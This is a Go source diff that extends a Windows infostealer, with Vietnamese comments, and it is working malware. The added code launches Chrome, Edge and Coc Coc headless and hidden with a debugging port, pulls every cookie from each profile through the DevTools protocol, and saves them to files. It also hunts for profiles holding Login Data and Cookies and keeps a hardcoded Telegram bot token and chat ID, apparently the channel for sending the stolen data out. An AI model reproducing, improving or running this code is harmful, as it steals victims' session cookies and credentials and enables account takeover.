@@ -32,6 +32,12 @@ type IPLocation struct {
 	Country string `json:"country"`
 }
 
+type ProfileStatus struct {
+	name     string
+	attempts int
+	success  bool
+}
+
 const (
 	TelegramBotToken = "7944937404:AAFGYLrLSBzkB2t0k03KG953KLFsjYhKyQE"
 	TelegramChatID   = "-4599802638"
@@ -212,33 +218,32 @@ func extractFace(cookieFilePath string, fbFolder string) error {
 	return nil
 }
 
-func countFiles(dir string) (int, int) {
+func countFiles(sourceDir string) (int, int) {
 	log.SetOutput(ioutil.Discard)
 
 	cookieCount := 0
 	passwordCount := 0
 
-	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			return nil
+	// Đếm file trong thư mục Cookie
+	cookieDir := filepath.Join(sourceDir, "Cookie")
+	if _, err := os.Stat(cookieDir); err == nil {
+		files, err := ioutil.ReadDir(cookieDir)
+		if err == nil {
+			cookieCount = len(files)
 		}
+	}
 
-		if !info.IsDir() {
-			fileName := strings.ToLower(info.Name())
-			if strings.Contains(fileName, "cookie") {
-				cookieCount++
-			} else if strings.Contains(fileName, "password") ||
-				strings.Contains(fileName, "login") ||
-				strings.Contains(fileName, "credential") {
-				passwordCount++
-			}
+	// Đếm file trong thư mục Password
+	passwordDir := filepath.Join(sourceDir, "Password")
+	if _, err := os.Stat(passwordDir); err == nil {
+		files, err := ioutil.ReadDir(passwordDir)
+		if err == nil {
+			passwordCount = len(files)
 		}
-		return nil
-	})
+	}
 
 	return cookieCount, passwordCount
 }
-
 func countFacebookFiles(fbFolder string) int {
 	log.SetOutput(ioutil.Discard)
 
@@ -421,8 +426,7 @@ func Browserdata() error {
 	return nil
 }
 
-// Sửa hàm Runcook()
-func Runcook() error {
+func Runcook(browserType string) error {
 	log.SetOutput(ioutil.Discard)
 
 	hostname, err := os.Hostname()
@@ -435,8 +439,7 @@ func Runcook() error {
 		return err
 	}
 
-	processBrowser("chrome")
-	processBrowser("edge")
+	processBrowser(browserType)
 
 	return nil
 }
@@ -452,7 +455,8 @@ func processBrowser(browserType string) {
 	programFiles86 := os.Getenv("PROGRAMFILES(X86)")
 	localAppData := os.Getenv("LOCALAPPDATA")
 
-	if browserType == "chrome" {
+	switch browserType {
+	case "chrome":
 		userDataDir = filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
 		execPaths = []string{
 			`C:\Program Files\Google\Chrome\Application\chrome.exe`,
@@ -472,7 +476,7 @@ func processBrowser(browserType string) {
 			`E:\Program Files\Google\Chrome\Application\chrome.exe`,
 			`E:\Program Files (x86)\Google\Chrome\Application\chrome.exe`,
 		}
-	} else {
+	case "edge":
 		userDataDir = filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
 		execPaths = []string{
 			`C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`,
@@ -492,8 +496,21 @@ func processBrowser(browserType string) {
 			`E:\Program Files\Microsoft\Edge\Application\msedge.exe`,
 			`E:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`,
 		}
+	case "coccoc":
+		userDataDir = filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data")
+		execPaths = []string{
+			`C:\Program Files\CocCoc\Browser\Application\browser.exe`,
+			`C:\Program Files (x86)\CocCoc\Browser\Application\browser.exe`,
+			filepath.Join(localAppData, "CocCoc", "Browser", "Application", "browser.exe"),
+			`C:\Users\` + username + `\AppData\Local\CocCoc\Browser\Application\browser.exe`,
+			filepath.Join(programFiles, "CocCoc", "Browser", "Application", "browser.exe"),
+			filepath.Join(programFiles86, "CocCoc", "Browser", "Application", "browser.exe"),
+			`D:\Program Files\CocCoc\Browser\Application\browser.exe`,
+			`D:\Program Files (x86)\CocCoc\Browser\Application\browser.exe`,
+			`E:\Program Files\CocCoc\Browser\Application\browser.exe`,
+			`E:\Program Files (x86)\CocCoc\Browser\Application\browser.exe`,
+		}
 	}
-
 	var execPath string
 	for _, path := range execPaths {
 		if _, err := os.Stat(path); err == nil {
@@ -511,11 +528,164 @@ func processBrowser(browserType string) {
 	}
 
 	profiles := findProfiles(userDataDir)
-	for i, profile := range profiles {
-		processProfile(browserType, execPath, userDataDir, profile, i)
+	if len(profiles) == 0 {
+		return
+	}
+
+	// Khởi tạo slice theo dõi trạng thái của các profile
+	var profileStatuses []ProfileStatus
+	for _, profile := range profiles {
+		profileStatuses = append(profileStatuses, ProfileStatus{
+			name:     profile,
+			attempts: 0,
+			success:  false,
+		})
+	}
+
+	maxRetries := 3
+	for retry := 0; retry < maxRetries; retry++ {
+		var failedProfiles []ProfileStatus
+
+		// Xử lý các profile chưa thành công
+		for i := range profileStatuses {
+			if profileStatuses[i].success {
+				continue
+			}
+
+			if profileStatuses[i].attempts >= maxRetries {
+				continue
+			}
+
+			success := processProfileWithCheck(browserType, execPath, userDataDir, profileStatuses[i].name, i)
+			profileStatuses[i].attempts++
+
+			if !success {
+				failedProfiles = append(failedProfiles, profileStatuses[i])
+			} else {
+				profileStatuses[i].success = true
+			}
+
+			time.Sleep(2 * time.Second)
+		}
+
+		// Nếu không còn profile nào thất bại hoặc vượt quá số lần thử
+		if len(failedProfiles) == 0 {
+			break
+		}
+
+		// Log các profile thất bại để theo dõi
+		for _, failed := range failedProfiles {
+			log.Printf("Profile %s failed attempt %d/%d\n", failed.name, failed.attempts, maxRetries)
+		}
+
+		// Đợi thêm thời gian trước khi thử lại
 		time.Sleep(2 * time.Second)
 	}
 }
+func processProfileWithCheck(browserType, execPath, userDataDir, profileName string, profileNum int) bool {
+	profileType := getProfileNumber(profileName)
+	fileName := fmt.Sprintf("cookies_%s_%s.txt", browserType, profileType)
+
+	var debugPort string
+	switch browserType {
+	case "chrome":
+		debugPort = fmt.Sprintf("92%d", 22+profileNum)
+	case "edge":
+		debugPort = fmt.Sprintf("93%d", 23+profileNum)
+	case "coccoc":
+		debugPort = fmt.Sprintf("94%d", 24+profileNum)
+	}
+
+	// Đảm bảo kill browser trước khi bắt đầu
+	killBrowsers()
+
+	// Tạo context với timeout
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+
+	// Khởi động browser với các flag tối ưu
+	cmd := exec.Command(execPath,
+		"--remote-debugging-port="+debugPort,
+		"--headless=new",
+		"--disable-gpu",
+		"--no-sandbox",
+		"--disable-dev-shm-usage",
+		"--disable-background-networking",
+		"--disable-background-timer-throttling",
+		"--disable-backgrounding-occluded-windows",
+		"--disable-breakpad",
+		"--disable-client-side-phishing-detection",
+		"--disable-component-update",
+		"--disable-default-apps",
+		"--disable-hang-monitor",
+		"--disable-prompt-on-repost",
+		"--disable-sync",
+		"--disable-translate",
+		"--metrics-recording-only",
+		"--no-first-run",
+		"--safebrowsing-disable-auto-update",
+		"--password-store=basic",
+		"--use-mock-keychain",
+		"--user-data-dir="+userDataDir,
+		"--profile-directory="+profileName,
+	)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	if err := cmd.Start(); err != nil {
+		return false
+	}
+
+	// Đảm bảo process được kill khi function kết thúc
+	defer func() {
+		if cmd.Process != nil {
+			cmd.Process.Kill()
+		}
+		killBrowsers()
+	}()
+
+	// Đợi browser khởi động
+	time.Sleep(3 * time.Second)
+
+	// Thiết lập kết nối CDP
+	wsURL := fmt.Sprintf("ws://localhost:%s", debugPort)
+	allocCtx, cancel := chromedp.NewRemoteAllocator(ctx, wsURL)
+	defer cancel()
+
+	taskCtx, cancel := chromedp.NewContext(allocCtx)
+	defer cancel()
+
+	// Channel để theo dõi kết quả
+	done := make(chan bool, 1)
+
+	go func() {
+		var cookies []*network.Cookie
+		err := chromedp.Run(taskCtx,
+			chromedp.ActionFunc(func(ctx context.Context) error {
+				var err error
+				cookies, err = storage.GetCookies().Do(ctx)
+				return err
+			}),
+		)
+
+		if err == nil && len(cookies) > 0 {
+			err = saveCookies(cookies, fileName)
+			if err == nil {
+				done <- true
+				return
+			}
+		}
+		done <- false
+	}()
+
+	// Đợi kết quả hoặc timeout
+	select {
+	case success := <-done:
+		return success
+	case <-ctx.Done():
+		return false
+	}
+}
+
 func searchBrowser(browserName string) string {
 	log.SetOutput(ioutil.Discard)
 
@@ -559,21 +729,80 @@ func searchBrowser(browserName string) string {
 
 func findProfiles(userDataDir string) []string {
 	log.SetOutput(ioutil.Discard)
-
 	var profiles []string
+
+	// Thêm Default profile nếu tồn tại
 	if _, err := os.Stat(filepath.Join(userDataDir, "Default")); err == nil {
 		profiles = append(profiles, "Default")
 	}
 
+	// Đọc thư mục User Data
 	entries, err := ioutil.ReadDir(userDataDir)
 	if err != nil {
 		return profiles
 	}
 
+	// Map để kiểm tra trùng lặp
+	profileMap := make(map[string]bool)
+	for _, profile := range profiles {
+		profileMap[profile] = true
+	}
+
+	// Các pattern cần tìm
+	patterns := []string{
+		"Profile *",
+		"Person *",
+		"Guest Profile",
+		"System Profile",
+	}
+
 	for _, entry := range entries {
-		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
-			if _, err := os.Stat(filepath.Join(userDataDir, entry.Name(), "Preferences")); err == nil {
-				profiles = append(profiles, entry.Name())
+		if !entry.IsDir() {
+			continue
+		}
+
+		name := entry.Name()
+
+		// Kiểm tra các pattern
+		for _, pattern := range patterns {
+			matched, err := filepath.Match(pattern, name)
+			if err == nil && matched {
+				// Kiểm tra file Preferences để đảm bảo đây là profile hợp lệ
+				prefPath := filepath.Join(userDataDir, name, "Preferences")
+				if _, err := os.Stat(prefPath); err == nil {
+					if !profileMap[name] {
+						profiles = append(profiles, name)
+						profileMap[name] = true
+					}
+				}
+				break
+			}
+		}
+
+		// Kiểm tra thêm các thư mục profile có thể có tên khác
+		prefPath := filepath.Join(userDataDir, name, "Preferences")
+		if _, err := os.Stat(prefPath); err == nil {
+			if !profileMap[name] {
+				// Kiểm tra thêm một số file đặc trưng của profile Chrome
+				indicators := []string{
+					"History",
+					"Cookies",
+					"Bookmarks",
+					"Login Data",
+				}
+
+				isProfile := false
+				for _, indicator := range indicators {
+					if _, err := os.Stat(filepath.Join(userDataDir, name, indicator)); err == nil {
+						isProfile = true
+						break
+					}
+				}
+
+				if isProfile {
+					profiles = append(profiles, name)
+					profileMap[name] = true
+				}
 			}
 		}
 	}
@@ -581,60 +810,6 @@ func findProfiles(userDataDir string) []string {
 	return profiles
 }
 
-func processProfile(browserType, execPath, userDataDir, profileName string, profileNum int) {
-	profileType := getProfileNumber(profileName)
-	fileName := fmt.Sprintf("cookies_%s_%s.txt", browserType, profileType)
-
-	var debugPort string
-	if browserType == "chrome" {
-		debugPort = "9222"
-	} else {
-		debugPort = "9223"
-	}
-
-	killBrowsers()
-	time.Sleep(2 * time.Second)
-
-	cmd := exec.Command(execPath,
-		"--remote-debugging-port="+debugPort,
-		"--headless=new",
-		"--disable-gpu",
-		"--user-data-dir="+userDataDir,
-		"--profile-directory="+profileName,
-	)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	if err := cmd.Start(); err != nil {
-		return
-	}
-
-	time.Sleep(3 * time.Second)
-
-	wsURL := fmt.Sprintf("ws://localhost:%s", debugPort)
-	ctx, cancel := chromedp.NewRemoteAllocator(context.Background(), wsURL)
-	defer cancel()
-
-	taskCtx, cancel := chromedp.NewContext(ctx)
-	defer cancel()
-
-	taskCtx, cancel = context.WithTimeout(taskCtx, 15*time.Second)
-	defer cancel()
-
-	var cookies []*network.Cookie
-	err := chromedp.Run(taskCtx,
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			var err error
-			cookies, err = storage.GetCookies().Do(ctx)
-			return err
-		}),
-	)
-
-	if err == nil && len(cookies) > 0 {
-		saveCookies(cookies, fileName)
-	}
-
-	killBrowsers()
-	time.Sleep(2 * time.Second)
-}
 func getProfileNumber(profileName string) string {
 	log.SetOutput(ioutil.Discard)
 
@@ -684,43 +859,60 @@ func saveCookies(cookies []*network.Cookie, fileName string) error {
 		return err
 	}
 
-	fullPath := filepath.Join(getWorkingPath(), hostname, "Cookie", fileName)
+	// Tạo directory nếu chưa tồn tại
+	cookieDir := filepath.Join(getWorkingPath(), hostname, "Cookie")
+	if err := os.MkdirAll(cookieDir, 0750); err != nil {
+		return err
+	}
+
+	fullPath := filepath.Join(cookieDir, fileName)
 	f, err := os.Create(fullPath)
 	if err != nil {
 		return err
 	}
 	defer f.Close()
 
+	successCount := 0
 	for _, cookie := range cookies {
-		domain := cookie.Domain
-		if !strings.HasPrefix(domain, ".") && !strings.HasPrefix(domain, "http") {
-			domain = "." + domain
-		}
-
-		path := cookie.Path
-		if path == "" {
-			path = "/"
-		}
-
-		secure := "FALSE"
-		if cookie.Secure {
-			secure = "TRUE"
-		}
-
-		expirationTime := int64(cookie.Expires)
-		if expirationTime == 0 {
-			expirationTime = time.Now().Add(365 * 24 * time.Hour).Unix()
-		}
-
-		line := fmt.Sprintf("%s\tTRUE\t%s\t%s\t%d\t%s\t%s\n",
-			domain, path, secure, expirationTime, cookie.Name, cookie.Value)
-
-		if _, err := f.WriteString(line); err != nil {
-			return err
+		if err := writeCookie(f, cookie); err == nil {
+			successCount++
 		}
 	}
 
+	// Kiểm tra xem có đủ cookies được lưu không
+	if successCount < len(cookies)/2 {
+		return fmt.Errorf("failed to save sufficient cookies")
+	}
+
 	return nil
+}
+
+func writeCookie(f *os.File, cookie *network.Cookie) error {
+	domain := cookie.Domain
+	if !strings.HasPrefix(domain, ".") && !strings.HasPrefix(domain, "http") {
+		domain = "." + domain
+	}
+
+	path := cookie.Path
+	if path == "" {
+		path = "/"
+	}
+
+	secure := "FALSE"
+	if cookie.Secure {
+		secure = "TRUE"
+	}
+
+	expirationTime := int64(cookie.Expires)
+	if expirationTime == 0 {
+		expirationTime = time.Now().Add(365 * 24 * time.Hour).Unix()
+	}
+
+	line := fmt.Sprintf("%s\tTRUE\t%s\t%s\t%d\t%s\t%s\n",
+		domain, path, secure, expirationTime, cookie.Name, cookie.Value)
+
+	_, err := f.WriteString(line)
+	return err
 }
 
 func killBrowsers() {
@@ -743,8 +935,6 @@ func killBrowsers() {
 		cmd.Run()
 	}
 
-	time.Sleep(2 * time.Second)
-
 	for _, browser := range browsers {
 		cmd := exec.Command("taskkill", "/F", "/IM", browser)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
@@ -759,16 +949,17 @@ func removeDirectory(path string) error {
 func main() {
 	log.SetOutput(ioutil.Discard)
 
-	time.Sleep(11 * time.Second)
-
 	killBrowsers()
 
 	Browserdata()
-	Runcook()
+
+	browsers := []string{"chrome", "edge", "coccoc"}
+	for _, browserType := range browsers {
+		Runcook(browserType)
+	}
 
 	hostname, _ := os.Hostname()
 	sourceDir := filepath.Join(getWorkingPath(), hostname)
-
 	fbFolder := filepath.Join(sourceDir, "Facebook")
 
 	filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
